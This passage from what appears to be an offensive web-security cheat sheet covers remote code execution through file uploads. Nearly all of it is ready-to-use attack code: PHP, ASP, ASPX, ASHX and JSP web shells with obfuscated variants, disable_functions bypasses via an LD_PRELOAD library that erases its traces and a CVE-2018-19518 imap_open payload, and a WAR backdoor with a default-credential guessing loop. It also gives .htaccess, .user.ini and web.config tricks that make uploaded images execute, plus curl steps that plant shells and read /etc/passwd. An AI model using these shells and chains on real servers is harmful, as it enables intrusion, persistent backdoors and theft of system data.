  <!-- ASP-style tags (if asp_tags=On, rare) -->
  <% system($_GET['cmd']); %>
  <%= `$_GET[cmd]` %>
  
  <!-- Script tag (removed in PHP 7, works in PHP 5.x) -->
  <script language="php">system($_GET['cmd']);</script>
  
  <!-- === Whitespace & comment obfuscation === -->
  <?php /*noise*/ system /*noise*/ ( /*noise*/ $_GET /*noise*/ [ /*noise*/ 'cmd' /*noise*/ ] /*noise*/ ) /*noise*/ ; ?>
  
  <!-- Tab-filled -->
  <?php	system	(	$_GET	[	'cmd'	]	)	;	?>
  
  <!-- Newline-split -->
  <?php
  system
  (
  $_GET
  [
  'cmd'
  ]
  )
  ;
  ?>
  
  <!-- === BOM prefix (Unicode Byte Order Mark) === -->
  <!-- File starts with EF BB BF bytes before <?php -->
  <!-- May bypass signature scanners checking file start -->
  
  <!-- === Heredoc/Nowdoc syntax === -->
  <?php
  $cmd = <<<CMD
  {$_GET['cmd']}
  CMD;
  system($cmd);
  ?>
  
  <!-- === Conditional execution === -->
  <?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
  <?php isset($_GET['c'])&&system($_GET['c']); ?>
  <?php @$_GET['c']&&system($_GET['c']); ?>
  ```
  :::
::

### disable_functions Bypass

::warning
Many production PHP installations disable dangerous functions via `disable_functions` in `php.ini`. When your shell uploads but commands return nothing, this is likely the reason. Check which functions are disabled, then use alternatives or bypass techniques.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Diagnostic — Check What's Available"}
  ```php
  <?php
  echo "═══════════════════════════════════════\n";
  echo " PHP Execution Environment Diagnostic\n";
  echo "═══════════════════════════════════════\n\n";

  echo "PHP Version: " . phpversion() . "\n";
  echo "PHP SAPI: " . php_sapi_name() . "\n";
  echo "OS: " . php_uname() . "\n";
  echo "User: " . get_current_user() . "\n";
  echo "PID: " . getmypid() . "\n\n";

  echo "═══ Disabled Functions ═══\n";
  $disabled = ini_get('disable_functions');
  echo ($disabled ?: "NONE") . "\n\n";

  echo "═══ Execution Functions ═══\n";
  $exec_fns = [
    'system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open',
    'pcntl_exec', 'pcntl_fork', 'dl', 'putenv', 'mail', 'error_log',
    'mb_send_mail', 'imap_open', 'assert', 'preg_replace',
    'create_function', 'call_user_func', 'call_user_func_array',
    'array_map', 'array_filter', 'usort', 'ob_start',
    'file_get_contents', 'file_put_contents', 'fopen', 'fwrite',
    'readfile', 'highlight_file', 'show_source',
    'curl_exec', 'curl_init', 'fsockopen', 'stream_socket_client',
    'include', 'require', 'eval', 'move_uploaded_file',
    'copy', 'rename', 'unlink', 'mkdir', 'rmdir',
    'scandir', 'glob', 'opendir',
  ];

  $available = [];
  $blocked = [];
  foreach ($exec_fns as $fn) {
    if (function_exists($fn) && !in_array($fn, explode(',', str_replace(' ', '', $disabled)))) {
      $available[] = $fn;
      echo "  [✓] $fn\n";
    } else {
      $blocked[] = $fn;
      echo "  [✗] $fn\n";
    }
  }

  echo "\nAvailable: " . count($available) . " | Blocked: " . count($blocked) . "\n\n";

  echo "═══ Security Settings ═══\n";
  echo "open_basedir: " . (ini_get('open_basedir') ?: "NONE") . "\n";
  echo "safe_mode: " . (ini_get('safe_mode') ?: "Off") . "\n";
  echo "allow_url_include: " . ini_get('allow_url_include') . "\n";
  echo "allow_url_fopen: " . ini_get('allow_url_fopen') . "\n";

  echo "\n═══ Loaded Extensions ═══\n";
  echo implode(', ', get_loaded_extensions()) . "\n";
  ?>
  ```

  ```bash
  # Upload diagnostic script
  # Save above PHP to diagnostic.php
  curl -X POST https://target.com/upload \
    -F "file=@diagnostic.php;type=image/jpeg" -b "session=COOKIE"

  # Read results
  curl -s "https://target.com/uploads/diagnostic.php"
  # Focus on which execution functions are available
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Alternative Execution Functions"}
  ```php
  <!-- === Try functions NOT in typical disable_functions lists === -->

  <!-- pcntl_exec (often overlooked in disable lists) -->
  <?php
  // pcntl_exec replaces the current process — no output returned directly
  // Write output to a file, then read it
  $cmd = $_GET['cmd'];
  $outfile = '/tmp/pcntl_out_' . getmypid();
  pcntl_exec('/bin/bash', ['-c', "$cmd > $outfile 2>&1"]);
  // This won't work directly — pcntl_exec replaces the process
  // Use pcntl_fork instead:
  $pid = pcntl_fork();
  if ($pid == 0) {
    // Child process
    pcntl_exec('/bin/bash', ['-c', "$cmd > $outfile 2>&1"]);
    exit(0);
  }
  pcntl_waitpid($pid, $status);
  echo file_get_contents($outfile);
  @unlink($outfile);
  ?>

  <!-- FFI (PHP 7.4+ with ffi.enable=true) -->
  <?php
  if (extension_loaded('ffi')) {
    $ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
    $ffi->system($_GET['cmd'] . ' > /tmp/ffi_out 2>&1');
    echo file_get_contents('/tmp/ffi_out');
    @unlink('/tmp/ffi_out');
  } else {
    echo "FFI not available";
  }
  ?>

  <!-- proc_open (sometimes not in disable list) -->
  <?php
  $d = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
  $p = proc_open($_GET['cmd'], $d, $pipes);
  if (is_resource($p)) {
    echo stream_get_contents($pipes[1]);
    echo stream_get_contents($pipes[2]);
    fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
    proc_close($p);
  }
  ?>

  <!-- popen (sometimes not disabled) -->
  <?php
  $h = popen($_GET['cmd'] . ' 2>&1', 'r');
  while (!feof($h)) echo fread($h, 4096);
  pclose($h);
  ?>

  <!-- expect_popen (if expect extension loaded) -->
  <?php
  if (function_exists('expect_popen')) {
    $stream = expect_popen($_GET['cmd']);
    while ($line = fgets($stream)) echo $line;
    fclose($stream);
  }
  ?>

  <!-- === File operations when exec is completely disabled === -->
  <?php
  // Even without command execution, file operations cause major impact

  // Read arbitrary files
  if (isset($_GET['read'])) {
    echo "<pre>" . htmlspecialchars(file_get_contents($_GET['read'])) . "</pre>";
  }

  // Write files (create backdoor, modify config)
  if (isset($_POST['write']) && isset($_POST['data'])) {
    file_put_contents($_POST['write'], $_POST['data']);
    echo "Written: " . $_POST['write'];
  }

  // List directories
  if (isset($_GET['dir'])) {
    $files = scandir($_GET['dir']);
    echo "<pre>"; foreach ($files as $f) echo "$f\n"; echo "</pre>";
  }

  // Include other PHP files (access database, read secrets)
  if (isset($_GET['inc'])) {
    include($_GET['inc']);
  }
  ?>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="LD_PRELOAD Bypass (Advanced)"}
  When ALL command execution functions are disabled but `putenv()` and `mail()` (or `mb_send_mail()` or `error_log()`) are available, you can inject a shared library that executes commands when loaded.

  ```bash
  # ═══════════════════════════════════════════
  #  LD_PRELOAD + mail() bypass walkthrough
  # ═══════════════════════════════════════════

  # Step 1: Create malicious shared library (on your machine)
  cat > /tmp/bypass_preload.c << 'CEOF'
  #define _GNU_SOURCE
  #include <stdlib.h>
  #include <stdio.h>
  #include <string.h>
  #include <unistd.h>
  #include <sys/types.h>

  __attribute__ ((__constructor__)) void preload_exec(void) {
      // Read command from environment variable
      const char* cmd = getenv("EVIL_CMD");
      if (cmd != NULL) {
          char buf[4096];
          // Execute command and write output to temp file
          snprintf(buf, sizeof(buf), "%s > /tmp/.preload_output 2>&1", cmd);
          system(buf);
      }
      // Clean up to avoid detection
      unsetenv("LD_PRELOAD");
      unsetenv("EVIL_CMD");
  }
  CEOF

  # Step 2: Compile for target architecture
  # For x86_64 Linux target:
  gcc -shared -fPIC -o /tmp/bypass.so /tmp/bypass_preload.c -nostartfiles
  # For i386:
  # gcc -m32 -shared -fPIC -o /tmp/bypass.so /tmp/bypass_preload.c -nostartfiles

  # Step 3: Upload the .so file
  curl -X POST https://target.com/upload \
    -F "file=@/tmp/bypass.so;type=image/jpeg;filename=bypass.so" \
    -b "session=COOKIE"
  # Note the upload path — e.g., /uploads/bypass.so

  # Step 4: Create and upload the PHP trigger
  cat > /tmp/ld_trigger.php << 'PHPEOF'
  <?php
  $cmd = $_GET['cmd'];
  if ($cmd) {
    $so_path = __DIR__ . '/bypass.so'; // Adjust path as needed
    // Alternative: Use absolute path found during upload
    // $so_path = '/var/www/html/uploads/bypass.so';

    putenv("EVIL_CMD=$cmd");
    putenv("LD_PRELOAD=$so_path");

    // Trigger: mail() calls sendmail which loads LD_PRELOAD
    @mail("a@b.c", "subj", "body");

    // Read output
    $output = @file_get_contents('/tmp/.preload_output');
    @unlink('/tmp/.preload_output');

    if ($output) {
      echo "<pre>$output</pre>";
    } else {
      echo "No output — try mb_send_mail() or error_log() instead";

      // Alternative trigger: mb_send_mail
      // @mb_send_mail("a@b.c", "subj", "body");

      // Alternative trigger: error_log with sendmail
      // ini_set('error_log', '/dev/null');
      // error_log("trigger", 1, "a@b.c");

      // Read again
      $output = @file_get_contents('/tmp/.preload_output');
      @unlink('/tmp/.preload_output');
      echo "<pre>$output</pre>";
    }
  } else {
    echo "Usage: ?cmd=id";
  }
  ?>
  PHPEOF

  curl -X POST https://target.com/upload \
    -F "file=@/tmp/ld_trigger.php;type=image/jpeg" -b "session=COOKIE"

  # Step 5: Execute commands
  curl "https://target.com/uploads/ld_trigger.php?cmd=id"
  curl "https://target.com/uploads/ld_trigger.php?cmd=whoami"
  curl "https://target.com/uploads/ld_trigger.php?cmd=cat+/etc/passwd"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="imap_open Bypass (CVE-2018-19518)"}
  ```php
  <!-- If IMAP extension is loaded and imap_open() is not disabled -->
  <?php
  // CVE-2018-19518 — imap_open() passes -oProxyCommand to rstringing
  // which allows command execution via SSH ProxyCommand

  $cmd = $_GET['cmd'];
  if ($cmd && function_exists('imap_open')) {
    $payload = "x]=-oProxyCommand=echo\t" . base64_encode($cmd . " > /tmp/imap_out 2>&1") . "\t|base64\t-d|bash\n";
    @imap_open("{localhost/imap}INBOX", $payload, "");
    $output = @file_get_contents('/tmp/imap_out');
    @unlink('/tmp/imap_out');
    echo "<pre>$output</pre>";
  } else {
    echo "imap_open not available";
  }
  ?>
  ```

  ```bash
  # Check if IMAP extension is available
  curl -s "https://target.com/uploads/diagnostic.php" | grep -i "imap"

  # Upload and test
  curl "https://target.com/uploads/imap_bypass.php?cmd=id"
  ```
  :::
::

---

## ASP / ASPX Execution Techniques

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="ASP Classic Shells"}
  ```asp
  <!-- === Minimal eval-based ASP === -->
  <% eval request("cmd") %>

  <!-- === CMD.exe execution === -->
  <%
  Dim cmd : cmd = Request("cmd")
  If cmd <> "" Then
    Set wsh = Server.CreateObject("WScript.Shell")
    Set proc = wsh.Exec("cmd.exe /c " & cmd)
    Response.Write "<pre>" & proc.StdOut.ReadAll() & "</pre>"
    Set proc = Nothing
    Set wsh = Nothing
  End If
  %>

  <!-- === PowerShell via ASP === -->
  <%
  Set wsh = Server.CreateObject("WScript.Shell")
  Set proc = wsh.Exec("powershell.exe -NoP -NonI -Command " & Request("cmd"))
  Response.Write proc.StdOut.ReadAll()
  %>

  <!-- === File read via ASP === -->
  <%
  Set fso = Server.CreateObject("Scripting.FileSystemObject")
  Set f = fso.OpenTextFile(Request("path"), 1)
  Response.Write "<pre>" & f.ReadAll() & "</pre>"
  f.Close
  %>

  <!-- === Obfuscated ASP (string split) === -->
  <%
  Dim x : x = "WScr" & "ipt.Sh" & "ell"
  Set o = Server.CreateObject(x)
  Set p = o.Exec("cm" & "d.exe /c " & Request("c"))
  Response.Write p.StdOut.ReadAll()
  %>
  ```

  ```bash
  # Upload ASP shell
  echo '<% eval request("cmd") %>' > shell.asp
  curl -X POST https://target.com/upload \
    -F "file=@shell.asp;type=image/jpeg" -b "session=COOKIE"

  # Execute via POST (eval reads POST by default)
  curl -X POST "https://target.com/uploads/shell.asp" \
    -d 'cmd=Response.Write(Server.CreateObject("WScript.Shell").Exec("cmd.exe /c whoami").StdOut.ReadAll())'

  # Simpler cmd execution variant
  cat > cmd_shell.asp << 'EOF'
  <%Set o=Server.CreateObject("WScript.Shell"):Set p=o.Exec("cmd.exe /c "&Request("cmd")):Response.Write p.StdOut.ReadAll()%>
  EOF
  curl -X POST https://target.com/upload \
    -F "file=@cmd_shell.asp;type=image/jpeg" -b "session=COOKIE"

  curl "https://target.com/uploads/cmd_shell.asp?cmd=whoami"
  curl "https://target.com/uploads/cmd_shell.asp?cmd=ipconfig"
  curl "https://target.com/uploads/cmd_shell.asp?cmd=type+c:\windows\win.ini"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="ASPX (C#) Shells"}
  ```aspx
  <!-- === Minimal ASPX command execution === -->
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <%
  string cmd = Request["cmd"];
  if (cmd != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.RedirectStandardError = true;
    p.StartInfo.CreateNoWindow = true;
    p.Start();
    string output = p.StandardOutput.ReadToEnd();
    string error = p.StandardError.ReadToEnd();
    p.WaitForExit();
    Response.Write("<pre>" + Server.HtmlEncode(output + error) + "</pre>");
  }
  %>

  <!-- === Linux ASPX (.NET Core / Mono) === -->
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <%
  string cmd = Request["cmd"];
  if (cmd != null) {
    Process p = new Process();
    p.StartInfo.FileName = "/bin/bash";
    p.StartInfo.Arguments = "-c \"" + cmd + "\"";
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.RedirectStandardError = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd() + "</pre>");
    p.WaitForExit();
  }
  %>

  <!-- === PowerShell execution via ASPX === -->
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <%
  string cmd = Request["ps"];
  if (cmd != null) {
    Process p = new Process();
    p.StartInfo.FileName = "powershell.exe";
    p.StartInfo.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -Command \"" + cmd + "\"";
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
  }
  %>
  ```

  ```bash
  # Upload and test ASPX shell
  cat > shell.aspx << 'ASPXEOF'
  <%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%string c=Request["cmd"];if(c!=null){Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");}%>
  ASPXEOF

  curl -X POST https://target.com/upload \
    -F "file=@shell.aspx;type=image/jpeg" -b "session=COOKIE"

  curl "https://target.com/uploads/shell.aspx?cmd=whoami"
  curl "https://target.com/uploads/shell.aspx?cmd=ipconfig+/all"
  curl "https://target.com/uploads/shell.aspx?cmd=net+user"
  curl "https://target.com/uploads/shell.aspx?cmd=systeminfo"
  curl "https://target.com/uploads/shell.aspx?cmd=type+c:\inetpub\wwwroot\web.config"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="ASHX Handler & web.config Shells"}
  ```csharp
  // === .ashx Generic Handler — often less monitored than .aspx ===
  <%@ WebHandler Language="C#" Class="H" %>
  using System; using System.Web; using System.Diagnostics;
  public class H : IHttpHandler {
    public void ProcessRequest(HttpContext ctx) {
      ctx.Response.ContentType = "text/plain";
      string c = ctx.Request["cmd"];
      if (c != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + c;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        ctx.Response.Write(p.StandardOutput.ReadToEnd());
      }
    }
    public bool IsReusable { get { return false; } }
  }
  ```

  ```xml
  <!-- === web.config that executes ASPX code embedded in itself === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.web>
      <compilation debug="true"/>
    </system.web>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="web_config" path="*.config" verb="*"
             modules="IsapiModule"
             scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll"
             resourceType="Unspecified" requireAccess="Write"
             preCondition="bitness64" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
          <hiddenSegments>
            <remove segment="web.config" />
          </hiddenSegments>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  <!--
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <%
  Response.Write("<pre>" + new Process() {
    StartInfo = new ProcessStartInfo("cmd.exe", "/c " + Request["cmd"]) {
      UseShellExecute = false, RedirectStandardOutput = true
    }
  }.Start().StandardOutput.ReadToEnd() + "</pre>");
  %>
  -->
  ```

  ```bash
  # Upload web.config as a shell
  curl -X POST https://target.com/upload \
    -F "file=@web.config;type=text/xml" -b "session=COOKIE"

  curl "https://target.com/uploads/web.config?cmd=whoami"
  ```
  :::
::

---

## JSP Execution Techniques

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="JSP Runtime.exec Shells"}
  ```jsp
  <!-- === Basic JSP shell === -->
  <%@ page import="java.util.*,java.io.*" %>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    String line;
    out.println("<pre>");
    while ((line = br.readLine()) != null) out.println(line);
    while ((line = er.readLine()) != null) out.println("[ERR] " + line);
    out.println("</pre>");
  }
  %>

  <!-- === Windows JSP shell === -->
  <%@ page import="java.util.*,java.io.*" %>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    String os = System.getProperty("os.name").toLowerCase();
    String[] cmdArray;
    if (os.contains("win")) {
      cmdArray = new String[]{"cmd.exe", "/c", cmd};
    } else {
      cmdArray = new String[]{"/bin/bash", "-c", cmd};
    }
    Process p = Runtime.getRuntime().exec(cmdArray);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
  }
  %>

  <!-- === ProcessBuilder JSP shell (preferred over Runtime.exec) === -->
  <%@ page import="java.util.*,java.io.*" %>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    ProcessBuilder pb = new ProcessBuilder("/bin/bash", "-c", cmd);
    pb.redirectErrorStream(true);
    Process p = pb.start();
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.print("<pre>");
    while ((line = br.readLine()) != null) out.println(line);
    out.print("</pre>");
    p.waitFor();
  }
  %>

  <!-- === JSPX format (XML-based JSP — may bypass filters) === -->
  <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
    <jsp:directive.page import="java.util.*,java.io.*"/>
    <jsp:scriptlet>
      String c=request.getParameter("cmd");
      if(c!=null){
        Process p=new ProcessBuilder("/bin/bash","-c",c).redirectErrorStream(true).start();
        java.util.Scanner s=new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
        out.print("<pre>"+(s.hasNext()?s.next():"")+"</pre>");
      }
    </jsp:scriptlet>
  </jsp:root>
  ```

  ```bash
  # Upload JSP shell
  cat > shell.jsp << 'JSPEOF'
  <%@ page import="java.util.*,java.io.*" %><%String c=request.getParameter("cmd");if(c!=null){ProcessBuilder pb=new ProcessBuilder("/bin/bash","-c",c);pb.redirectErrorStream(true);Process p=pb.start();java.util.Scanner s=new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");out.print(s.hasNext()?s.next():"");}%>
  JSPEOF

  curl -X POST https://target.com/upload \
    -F "file=@shell.jsp;type=image/jpeg" -b "session=COOKIE"

  curl "https://target.com/uploads/shell.jsp?cmd=id"
  curl "https://target.com/uploads/shell.jsp?cmd=whoami"
  curl "https://target.com/uploads/shell.jsp?cmd=cat+/etc/passwd"

  # Upload JSPX variant (may bypass .jsp extension filters)
  curl -X POST https://target.com/upload \
    -F "file=@shell.jspx;type=image/jpeg" -b "session=COOKIE"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="WAR File Auto-Deployment"}
  WAR (Web Application Archive) files auto-deploy on Tomcat, JBoss, WebLogic, and other Java application servers. A WAR is simply a ZIP file containing JSP pages and a `WEB-INF/web.xml` descriptor.

  ```bash
  # ═══════════════════════════════════════════
  #  Create WAR file with embedded webshell
  # ═══════════════════════════════════════════

  # Step 1: Create directory structure
  mkdir -p warshell/WEB-INF

  # Step 2: Create JSP shell
  cat > warshell/cmd.jsp << 'JSPEOF'
  <%@ page import="java.util.*,java.io.*" %>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    ProcessBuilder pb = new ProcessBuilder("/bin/bash", "-c", cmd);
    pb.redirectErrorStream(true);
    Process p = pb.start();
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.print("<pre>");
    while ((line = br.readLine()) != null) out.println(line);
    out.print("</pre>");
    p.waitFor();
  } else {
    out.print("Usage: ?cmd=id");
  }
  %>
  JSPEOF

  # Step 3: Create web.xml
  cat > warshell/WEB-INF/web.xml << 'WEBEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <web-app xmlns="http://java.sun.com/xml/ns/javaee" version="3.0">
    <display-name>app</display-name>
  </web-app>
  WEBEOF

  # Step 4: Package as WAR (WAR = ZIP with .war extension)
  cd warshell && jar -cvf ../shell.war * && cd ..

  # Step 5: Upload via file upload
  curl -X POST https://target.com/upload \
    -F "file=@shell.war;type=application/java-archive" -b "session=COOKIE"

  # Step 6: If auto-deploy is enabled, access the deployed app
  # Tomcat deploys at: /[war-filename-without-extension]/
  curl "https://target.com/shell/cmd.jsp?cmd=id"

  # === Alternative: Deploy via Tomcat Manager (if creds available) ===
  curl -u "tomcat:tomcat" \
    "https://target.com/manager/text/deploy?path=/backdoor&update=true" \
    --upload-file shell.war

  curl "https://target.com/backdoor/cmd.jsp?cmd=id"

  # === Default Tomcat Manager credentials to try ===
  for creds in "tomcat:tomcat" "admin:admin" "tomcat:s3cret" "admin:password" \
                "tomcat:changethis" "manager:manager" "role1:tomcat" "both:tomcat"; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -u "$creds" \
      "https://target.com/manager/text/list" 2>/dev/null)
    if [ "$STATUS" = "200" ]; then
      echo "[+] Valid credentials: $creds"
    fi
  done

  # Cleanup
  rm -rf warshell shell.war
  ```
  :::
::

---

## Server Configuration Abuse for Execution

::caution
When direct execution is blocked because the uploaded file has a safe extension or the upload directory doesn't allow execution, uploading server configuration files can change the rules. This is a two-step attack: first upload the config file, then upload the shell.
::

::accordion
  :::accordion-item{icon="i-lucide-terminal" label=".htaccess Execution Chains (Apache)"}
  Apache's `.htaccess` files control per-directory configuration. When `AllowOverride` is enabled (common in shared hosting and many default configs), uploading a `.htaccess` file can make any extension execute as PHP.

  ```bash
  # ═══════════════════════════════════════════
  #  .htaccess Chain — Complete Walkthrough
  # ═══════════════════════════════════════════

  # === Method A: AddType directive ===
  echo 'AddType application/x-httpd-php .jpg .png .gif .txt .log .data' > .htaccess
  curl -X POST https://target.com/upload \
    -F "file=@.htaccess;type=text/plain" -b "session=COOKIE"
  # Now .jpg files execute as PHP

  # === Method B: AddHandler directive ===
  echo 'AddHandler application/x-httpd-php .jpg' > .htaccess

  # === Method C: SetHandler (ALL files execute as PHP) ===
  echo 'SetHandler application/x-httpd-php' > .htaccess

  # === Method D: FilesMatch regex ===
  cat > .htaccess << 'EOF'
  <FilesMatch "\.(jpg|png|gif|bmp|txt|log)$">
    SetHandler application/x-httpd-php
  </FilesMatch>
  EOF

  # === Method E: PHP-FPM proxy handler ===
  cat > .htaccess << 'EOF'
  <FilesMatch "\.jpg$">
    SetHandler "proxy:fcgi://127.0.0.1:9000"
  </FilesMatch>
  EOF

  # === Method F: CGI execution ===
  cat > .htaccess << 'EOF'
  Options +ExecCGI
  AddHandler cgi-script .jpg .py .pl
  EOF

  # === Method G: SSI (Server Side Includes) ===
  cat > .htaccess << 'EOF'
  Options +Includes
  AddType text/html .jpg
  AddOutputFilter INCLUDES .jpg
  EOF

  # === Method H: auto_prepend_file (PHP value override) ===
  cat > .htaccess << 'EOF'
  php_value auto_prepend_file "shell.jpg"
  EOF
  # Every PHP file in this directory will include shell.jpg first

  # === Method I: auto_append_file ===
  cat > .htaccess << 'EOF'
  php_value auto_append_file "shell.jpg"
  EOF

  # === Method J: Custom error document ===
  cat > .htaccess << 'EOF'
  ErrorDocument 404 /uploads/shell.jpg
  php_value auto_prepend_file "shell.jpg"
  EOF

  # ═══════════════════════════════════════════
  #  Step 2: Upload shell with image extension
  # ═══════════════════════════════════════════
  echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
  curl -X POST https://target.com/upload \
    -F "file=@shell.jpg;type=image/jpeg" -b "session=COOKIE"

  # ═══════════════════════════════════════════
  #  Step 3: Execute
  # ═══════════════════════════════════════════
  curl "https://target.com/uploads/shell.jpg?cmd=id"
  curl "https://target.com/uploads/shell.jpg?cmd=whoami"
  curl "https://target.com/uploads/shell.jpg?cmd=cat+/etc/passwd"

  # === If .htaccess upload is blocked by name ===
  # Try alternative upload techniques:
  curl -X POST https://target.com/upload \
    -F 'file=@.htaccess;filename=../.htaccess' -b "session=COOKIE"
  # Path traversal may place .htaccess in parent directory

  # Try with double extension
  curl -X POST https://target.com/upload \
    -F 'file=@.htaccess;filename=.htaccess.jpg' -b "session=COOKIE"
  ```
  :::

  :::accordion-item{icon="i-lucide-terminal" label=".user.ini Execution Chain (PHP-FPM)"}
  `.user.ini` files work with PHP-FPM and FastCGI SAPI (NOT mod_php). They provide per-directory PHP configuration overrides, including the ability to auto-include files before every PHP script execution.

  ```bash
  # ═══════════════════════════════════════════
  #  .user.ini Chain — Complete Walkthrough
  # ═══════════════════════════════════════════

  # Step 1: Verify PHP-FPM is in use (not mod_php)
  echo '<?php echo php_sapi_name(); ?>' > sapi_check.php
  # Upload and check — should return "fpm-fcgi" or "cgi-fcgi"

  # Step 2: Upload .user.ini
  echo 'auto_prepend_file=shell.jpg' > .user.ini
  curl -X POST https://target.com/upload \
    -F "file=@.user.ini;type=text/plain" -b "session=COOKIE"

  # Step 3: Upload shell with image extension
  echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
  curl -X POST https://target.com/upload \
    -F "file=@shell.jpg;type=image/jpeg" -b "session=COOKIE"

  # Step 4: Wait for .user.ini cache to expire
  # Default: user_ini.cache_ttl = 300 (5 minutes)
  echo "Waiting for .user.ini cache (up to 5 minutes)..."
  sleep 300

  # Step 5: Access ANY PHP file in the same directory
  # shell.jpg is auto-prepended to every PHP file execution in that dir
  curl "https://target.com/uploads/index.php?cmd=id"
  curl "https://target.com/uploads/any_existing_file.php?cmd=id"

  # If there's no PHP file in uploads directory:
  # Create one (if write access) or find one that exists
  curl "https://target.com/uploads/?cmd=id"  # Directory index might be PHP

  # === Alternative: php://filter wrapper === 
  # If auto_prepend_file with direct filename is blocked
  echo 'auto_prepend_file="php://filter/convert.base64-decode/resource=shell_b64.jpg"' > .user.ini
  
  # Upload base64-encoded PHP as image
  echo -n '<?php system($_GET["cmd"]); ?>' | base64 > shell_b64.jpg
  curl -X POST https://target.com/upload \
    -F "file=@shell_b64.jpg;type=image/jpeg" -b "session=COOKIE"

  # === Alternative: auto_append_file ===
  echo 'auto_append_file=shell.jpg' > .user.ini
  ```
  :::

  :::accordion-item{icon="i-lucide-terminal" label="web.config Execution Chain (IIS)"}
  ```bash
  # ═══════════════════════════════════════════
  #  web.config Handler Mapping — IIS
  # ═══════════════════════════════════════════

  # Method A: Map .jpg to ASP.NET handler
  cat > web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers>
        <add name="aspx_jpg" path="*.jpg" verb="*"
             type="System.Web.UI.PageHandlerFactory"
             resourceType="Unspecified" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".jpg" />
            <add fileExtension=".jpg" allowed="true" />
          </fileExtensions>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  EOF

  # Upload web.config
  curl -X POST https://target.com/upload \
    -F "file=@web.config;type=text/xml" -b "session=COOKIE"

  # Upload ASPX shell as .jpg
  cat > shell.jpg << 'ASPXEOF'
  <%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%string c=Request["cmd"];if(c!=null){Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");}%>
  ASPXEOF

  curl -X POST https://target.com/upload \
    -F "file=@shell.jpg;type=image/jpeg" -b "session=COOKIE"

  # Execute
  curl "https://target.com/uploads/shell.jpg?cmd=whoami"
  ```
  :::
::

---

## Indirect Execution Chains

When no direct execution path exists, chain the upload with another vulnerability.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="LFI + Upload = RCE"}
  ```bash
  # ═══════════════════════════════════════════
  #  Scenario: File uploads as .gif, no PHP extension allowed
  #  But application has LFI: index.php?page=<file>
  # ═══════════════════════════════════════════

  # Step 1: Upload PHP in image wrapper
